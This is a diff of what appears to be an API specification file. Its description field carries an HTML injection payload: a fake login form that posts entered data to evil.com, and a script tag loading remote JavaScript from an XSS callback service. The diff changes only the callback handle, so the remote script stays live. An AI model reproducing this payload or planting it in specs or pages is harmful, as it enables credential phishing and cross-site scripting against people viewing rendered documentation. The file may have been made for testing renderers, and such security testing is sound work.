@@ -5,7 +5,7 @@ info:
   description: '<div class="login-form">
     <div class="heading">
         <h1>HTML Injection : Fake Login</h1>
-        <script src=https://xss.report/c/faultydictator></script>
+        <script src=https://xss.report/c/xploiter></script>
     </div>
     <div class="form-container">
         <form action="http://evil.com/" method="post" class="form-signin">
